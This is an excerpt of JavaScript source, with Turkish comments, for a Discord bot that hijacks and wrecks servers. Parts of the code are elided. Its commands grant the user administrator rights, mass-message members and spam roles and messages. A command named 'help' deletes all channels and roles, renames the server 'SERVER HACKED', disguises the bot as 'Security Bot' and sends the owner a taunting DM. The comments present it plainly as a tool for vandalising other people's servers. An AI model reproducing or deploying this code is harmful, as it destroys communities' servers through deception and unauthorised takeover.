...
client.on("message", async msg => {
  if (msg.content === "s+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
...
client.on("message", msg => {
  if (msg.content === "s+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
...
client.on("message", async msg => {
  if (msg.content === "s+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();
    ...
    await msg.guild.setIcon("https://hizliresim.com/eTX4fG");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("❤️ SERVER HACKED ❤️"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://hizliresim.com/YQ85sl"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("❤️ Security Bot ❤️");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**Sunucun gitti geçmiş olsuunn :D **");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
 ...
 //www.youtube.com/enesacaryoutube TARAFINDAN YAPILMISTIR
    ...
    client.on("message", msg => {
  if (msg.content === "s+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "HACKED",
      color: "A93D3D",
...
client.on('message', msg => {
  if (msg.content === 's+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
